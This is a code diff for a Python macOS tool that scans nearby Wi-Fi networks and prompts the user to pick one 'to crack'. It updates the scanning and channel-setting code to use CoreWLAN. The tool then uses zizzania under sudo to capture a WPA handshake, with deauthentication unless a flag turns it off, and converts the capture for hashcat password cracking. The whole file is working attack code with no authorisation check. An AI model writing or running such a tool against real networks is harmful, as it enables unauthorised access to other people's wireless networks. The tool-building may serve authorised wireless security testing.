@@ -1,11 +1,10 @@
-import subprocess, re, argparse
+import subprocess, re, argparse, CoreWLAN
 from prettytable import PrettyTable
 from tabulate import tabulate
 from os.path import expanduser, join
 from pyfiglet import Figlet
 
-# Defie paths
-airport_path = '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport'
+# Define paths
 hashcat_path = join(expanduser('~'), 'hashcat', 'hashcat')
 zizzania_path = join(expanduser('~'), 'zizzania', 'src', 'zizzania')
 
@@ -19,57 +18,63 @@ parser.add_argument('-d', action='store_false')
 parser.add_argument('-o', action='store_true')
 args = parser.parse_args()
 
+# Get the default WiFi interface
+cwlan_interface = CoreWLAN.CWInterface.interface()
 
 def scan_networks():
     print('Scanning for networks...\n')
 
-    # Scan for networks using airport
-    scan = subprocess.run(['sudo', airport_path, '-s'], stdout=subprocess.PIPE)
-    scan = scan.stdout.decode('utf-8').split('\n')
-    count = len(scan) - 1
-    scan = [o.split() for o in scan]
+    # Scan for networks
+    scan_result, _ = cwlan_interface.scanForNetworksWithName_error_(None, None)
 
     # Parse scan results and display in a table
-    scan_result = PrettyTable(['Number', 'Name', 'BSSID', 'RSSI', 'Channel', 'Security'])
+    table = PrettyTable(['Number', 'Name', 'BSSID', 'RSSI', 'Channel', 'Security'])
     networks = {}
-    for i in range(1, count):
-        bssid = re.search('([0-9A-Fa-f]{2}[:]){5}([0-9A-Fa-f]{2})', ' '.join(scan[i])).group(0)
-        bindex = scan[i].index(bssid)
 
-        network = {}
-        network['ssid'] = ' '.join(scan[i][0:bindex])
-        network['bssid'] = bssid
-        network['rssi'] = scan[i][bindex + 1]
-        network['channel'] = scan[i][bindex + 2].split(',')[0]
-        network['security'] = scan[i][bindex + 5].split('(')[0]
+    if scan_result is not None:
+        for i, net in enumerate(scan_result):
+            network = {}
+            network['ssid'] = net.ssid()
+            network['bssid'] = net.bssid()
+            network['rssi'] = net.rssiValue()
+            network['channel'] = net.channel()
+            print(type(net.channel()))
+            
+            # Extracting security type from the CWNetwork description
+            network['security'] = re.search(r'security=(.*?)(,|$)', str(net)).group(1)
 
-        networks[i] = network
-        scan_result.add_row([i, network['ssid'], network['bssid'], network['rssi'], network['channel'], network['security']])
+            networks[i] = network
+            table.add_row([i + 1, network['ssid'], network['bssid'], network['rssi'], network['channel'], network['security']])
+    else:
+        print("No networks found or an error occurred.")
+        quit()
 
-    print(scan_result)
+    print(table)
 
     # Ask user to select a network to crack
-    x = int(input('\nSelect a network to crack: '))
+    x = int(input('\nSelect a network to crack: ')) - 1
     capture_network(networks[x]['bssid'], networks[x]['channel'])
 
 
 def capture_network(bssid, channel):
-    # Put the network card in monitor mode and set the channel
-    subprocess.run(['sudo', airport_path, '-z'])
-    subprocess.run(['sudo', airport_path, '-c' + channel])
+    # Dissociate from the current network
+    cwlan_interface.disassociate()
+
+    # Set the channel
+    available_channels = cwlan_interface.supportedWLANChannels()
+    desired_channel_obj = next((ch for ch in available_channels if ch.channelNumber() == int(channel)), None)
+    cwlan_interface.setWLANChannel_error_(desired_channel_obj, None)
 
     # Determine the network interface
     if args.i is None:
-        iface = subprocess.run(['networksetup', '-listallhardwareports'], stdout=subprocess.PIPE)
-        iface = iface.stdout.decode('utf-8').split('\n')
-        iface = iface[iface.index('Hardware Port: Wi-Fi') + 1].split(': ')[1]
+        iface = cwlan_interface.interfaceName()
     else:
         iface = args.i
 
     print('\nInitiating zizzania to capture handshake...\n')
 
     # Use zizzania to capture the handshake
-    subprocess.run([zizzania_path, '-i', iface, '-b', bssid, '-w', 'capture.pcap', '-q'] + ['-n'] * args.d)
+    subprocess.run(['sudo', zizzania_path, '-i', iface, '-b', bssid, '-w', 'capture.pcap', '-q'] + ['-n'] * args.d)
 
     # Convert the capture to hashcat format
     subprocess.run(['hcxpcapngtool', '-o', 'capture.hc22000', 'capture.pcap'], stdout=subprocess.PIPE)
